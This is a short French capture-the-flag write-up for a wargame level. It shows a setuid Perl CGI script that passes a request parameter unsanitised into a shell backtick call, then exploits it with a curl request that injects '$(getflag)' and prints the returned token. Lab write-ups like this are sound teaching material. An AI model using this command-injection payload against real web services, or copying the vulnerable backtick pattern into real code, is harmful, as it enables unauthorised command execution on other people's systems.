dans notre repertoire home, on a :
```shell
ls -la
total 16
dr-xr-x---+ 1 level04 level04  120 Mar  5  2016 .
d--x--x--x  1 root    users    340 Aug 30  2015 ..
-r-x------  1 level04 level04  220 Apr  3  2012 .bash_logout
-r-x------  1 level04 level04 3518 Aug 30  2015 .bashrc
-rwsr-sr-x  1 flag04  level04  152 Mar  5  2016 level04.pl
-r-x------  1 level04 level04  675 Apr  3  2012 .profile
```
un programme en perl : 
```perl
#!/usr/bin/perl
# localhost:4747
use CGI qw{param};
print "Content-type: text/html\n\n";
sub x {
  $y = $_[0];
  print `echo $y 2>&1`;
}
x(param("x"));
```
On voit que le script execute ce qui est passe en parametre x=
on inject le programme getflag

```shell
curl 'localhost:4747/level04.pl?x=$(getflag)'
Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
```
